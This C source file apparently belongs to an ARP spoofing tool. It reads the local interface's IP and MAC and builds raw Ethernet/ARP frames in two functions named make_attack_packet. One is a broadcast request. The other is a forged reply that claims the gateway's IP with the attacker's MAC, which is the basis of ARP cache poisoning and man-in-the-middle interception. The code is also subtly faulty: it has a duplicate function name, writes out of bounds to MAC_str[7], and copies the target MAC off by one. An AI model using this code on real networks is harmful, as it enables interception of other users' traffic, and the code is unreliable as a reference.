#include "get_network_address.h"
#include <string.h>
#include <stdio.h>

int get_ip_address (const char * ifr, unsigned char * out) {
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, ifr);
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
        perror( "ioctl() SIOCGIFADDR error");
        return -1;
    }
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;
    memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));

    close(sockfd);
    return 4;
}




void get_mac_address(unsigned char MAC_str[7], char* network_interface)
{
    #define HWADDR_len 6
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, network_interface);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<HWADDR_len; i++)
         MAC_str[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    MAC_str[7]='\0';
}


void make_attack_packet(u_char *mac, u_char *ip, u_char* make_packet, char *interface, u_char *sender_ip)
{
    //dest mac
    make_packet[0] = 0xFF;
    make_packet[1] = 0xFF;
    make_packet[2] = 0xFF;
    make_packet[3] = 0xFF;
    make_packet[4] = 0xFF;
    make_packet[5] = 0xFF;

    //src mac
    make_packet[6] = mac[0];
    make_packet[7] = mac[1];
    make_packet[8] = mac[2];
    make_packet[9] = mac[3];
    make_packet[10] = mac[4];
    make_packet[11] = mac[5];

    //type
    make_packet[12] = 0x08;
    make_packet[13] = 0x06;


    //8 byte
    make_packet[14]=0x00;
    make_packet[15]=0x01;
    make_packet[16]=0x08;
    make_packet[17]=0x00;
    make_packet[18]=0x06;
    make_packet[19]=0x04;
    make_packet[20]=0x00;
    make_packet[21]=0x01;

    //sender mac
    make_packet[22] = mac[0];
    make_packet[23] = mac[1];
    make_packet[24] = mac[2];
    make_packet[25] = mac[3];
    make_packet[26] = mac[4];
    make_packet[27] = mac[5];


    //sedner ip
    make_packet[28] = ip[0];
    make_packet[29] = ip[1];
    make_packet[30] = ip[2];
    make_packet[31] = ip[3];


    //dest mac
    make_packet[32] = 0x00;
    make_packet[33] = 0x00;
    make_packet[34] = 0x00;
    make_packet[35] = 0x00;
    make_packet[36] = 0x00;
    make_packet[37] = 0x00;

    //dest ip
    make_packet[38] = sender_ip[0];
    make_packet[39] = sender_ip[1];
    make_packet[40] = sender_ip[2];
    make_packet[41] = sender_ip[3];
}


void make_attack_packet(u_char *make_packet, u_char *mac, u_char * target_ip, u_char *sender_mac, u_char * sender_ip)
{
    make_packet[0] = sender_mac[0];
    make_packet[1] = sender_mac[1];
    make_packet[2] = sender_mac[2];
    make_packet[3] = sender_mac[3];
    make_packet[4] = sender_mac[4];
    make_packet[5] = sender_mac[5];

    //src mac
    make_packet[6] = mac[0];
    make_packet[7] = mac[1];
    make_packet[8] = mac[2];
    make_packet[9] = mac[3];
    make_packet[10] = mac[4];
    make_packet[11] = mac[5];

    //type
    make_packet[12] = 0x08;
    make_packet[13] = 0x06;


    //8 byte
    make_packet[14]=0x00;
    make_packet[15]=0x01;
    make_packet[16]=0x08;
    make_packet[17]=0x00;
    make_packet[18]=0x06;
    make_packet[19]=0x04;
    make_packet[20]=0x00;
    make_packet[21]=0x02;

    //sender mac
    make_packet[22] = mac[0];
    make_packet[23] = mac[1];
    make_packet[24] = mac[2];
    make_packet[25] = mac[3];
    make_packet[26] = mac[4];
    make_packet[27] = mac[5];


    //sedner ip -- gateway ip

    make_packet[28] = target_ip[0];
    make_packet[29] = target_ip[1];
    make_packet[30] = target_ip[2];
    make_packet[31] = target_ip[3];


    //dest mac
    make_packet[32] = sender_mac[1];
    make_packet[33] = sender_mac[2];
    make_packet[34] = sender_mac[3];
    make_packet[35] = sender_mac[4];
    make_packet[36] = sender_mac[5];
    make_packet[37] = sender_mac[6];

    //dest ip
    make_packet[38] = sender_ip[0];
    make_packet[39] = sender_ip[1];
    make_packet[40] = sender_ip[2];
    make_packet[41] = sender_ip[3];
}
